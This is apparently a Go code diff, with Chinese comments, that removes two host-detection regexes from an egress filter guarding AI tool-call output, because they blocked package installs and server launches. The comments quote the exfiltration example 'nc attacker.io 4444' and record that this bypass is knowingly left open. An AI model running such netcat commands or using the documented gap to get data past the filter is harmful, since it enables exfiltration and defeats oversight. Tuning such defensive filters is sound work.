@@ -57,29 +57,41 @@ var egressHostFromURL = regexp.MustCompile(`(?i)\b[a-z][a-z0-9+.\-]*://(\[[0-9A-
 // 同时它天然不匹配 `v1.2.3`、`package.json` 这类没有端口的裸点分词。
 var egressHostFromPort = regexp.MustCompile(`(?i)\b([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?)+):\d{1,5}\b`)
 
-// egressHostFromUserInfo 抓取 user@host 形态的主机（ssh/scp/git clone 的目标、
-// 以及带凭据的数据库 URI）。
+// 2026-10-11 晚审计：**撤掉两条提取规则**。它们各自都制造了大面积误伤，
+// 而它们想覆盖的形态早已有别的机制覆盖（或在结构上无法与合法写法区分）。
 //
-// 单列一条而不是指望 email 规则「顺带」拦到：那条规则是按邮箱形状设计的，它对
-// `deploy@10.24.7.91`（TLD 是数字）根本不命中，对 `deploy@attacker.io` 命中纯属
-// 巧合。一旦有人把 email 规则调出 egress scope，这个洞会静默回来——所以守卫对
-// 自己覆盖的形态必须自己认。
-var egressHostFromUserInfo = regexp.MustCompile(`(?i)\b[a-z0-9._%+\-]+@([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9\-]+)*)`)
-
-// egressHostFromBarePort 抓取「裸主机 空格 端口」形态：nc attacker.io 4444。
+// ## 撤掉 egressHostFromUserInfo（`pkg@host`）
 //
-// 这是 r1016 留下的最后一个已知绕过，但它是**最难干净收口**的一个形态：
-// `cat error.log 2>&1`、`grep -n x a.txt 2>/dev/null`、`python x.py 1>&2`
-// 里的「带点 token 紧跟数字」是 shell 里极其常见的写法（文件 + 重定向级别），
-// 照单全收会把一次 cat 变成整条响应 output_policy_blocked。
+// 原意是覆盖 ssh/scp 的 `user@host`，实测制造了：
 //
-// 因此端口右侧紧跟重定向/管道字符时不算端口——RE2 没有零宽断言（lookahead），
-// 所以右侧字符在代码里判（barePortFollower）。判的是「这个数字是不是端口」，
-// 不是「哪些 token 可以出现」，所以方向仍然是默认阻断，不需要维护白名单。
-var egressHostFromBarePort = regexp.MustCompile(`(?i)\b([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?)+)\s+(\d{1,5})`)
-
-// barePortFollower 是「紧跟在候选端口后面」的字符集合。命中即判定该数字不是端口。
-const barePortFollower = "0123456789>&|/\\"
+//	BLOCK npm install lodash@4.17.21
+//	BLOCK yarn add @types/node@20.11.0
+//	BLOCK go get github.com/foo/bar@v1.2.3
+//	BLOCK cargo add serde@1.0.197
+//	BLOCK gem install rails@7.1.3
+//
+// `lodash@4.17.21` 被当成 `user@4.17.21`，而 `4.17.21` 走 isNonExfiltrationHost
+// 得到「带点且不在豁免后缀里」→ 公网 → 阻断。**装包是工具调用里最常见的操作**，
+// 这条规则把它整类打死了。
+//
+// 而它想覆盖的形态**本来就覆盖着**：email 规则命中 `user@host.tld`（TLD 为字母），
+// 由 isNonExfiltrationEmailFragment 把主机部分交回可达性判定；
+// `user@10.24.7.91` 由 IP 规则覆盖。两条路都通，这条正则纯属冗余且有害。
+//
+// ## 撤掉 egressHostFromBarePort（`host 空格 端口`）
+//
+// 原意是收口 `nc attacker.io 4444`，实测制造了：
+//
+//	BLOCK node server.js 8080
+//	BLOCK python3 main.py 100
+//
+// `server.js 8080` 与 `attacker.io 4444` 在**结构上不可区分**——都是「带点 token
+// + 空格 + 数字」。要区分只能知道前一个 token 是命令还是主机，那需要一张命令动词
+// 表，是另一种枚举；而默认阻断的方向在这里是错的：误伤的是 `node server.js 8080`
+// 这种日常操作，放过的是 `nc attacker.io 4444` 这个更窄的绕过。
+//
+// 参照 2026-10-08 那次事故的教训（把 tool-driving 模型打死，代价由每个请求承担），
+// 这里选择**放过并记录残留**，而不是制造大面积误伤。
 
 // nonPublicHostSuffixes 是**明确不可路由**的主机后缀。
 //
@@ -156,25 +168,6 @@ func hasPublicHostDestination(text string) bool {
 	}
 	for _, m := range egressHostFromPort.FindAllStringSubmatch(text, -1) {
 		if !isNonExfiltrationDestinationHost(m[1]) {
-			return true
-		}
-	}
-	for _, m := range egressHostFromUserInfo.FindAllStringSubmatch(text, -1) {
-		if !isNonExfiltrationDestinationHost(m[1]) {
-			return true
-		}
-	}
-	for _, loc := range egressHostFromBarePort.FindAllStringSubmatchIndex(text, -1) {
-		// m[2],m[3] 是主机；m[4],m[5] 是候选端口。
-		portEnd := loc[5]
-		if portEnd < 0 {
-			continue
-		}
-		if portEnd < len(text) && strings.IndexByte(barePortFollower, text[portEnd]) >= 0 {
-			// 紧跟重定向/管道/数字，例如 `cat error.log 2>&1` 里的 2 不是端口。
-			continue
-		}
-		if !isNonExfiltrationDestinationHost(text[loc[2]:loc[3]]) {
 			return true
 		}
 	}
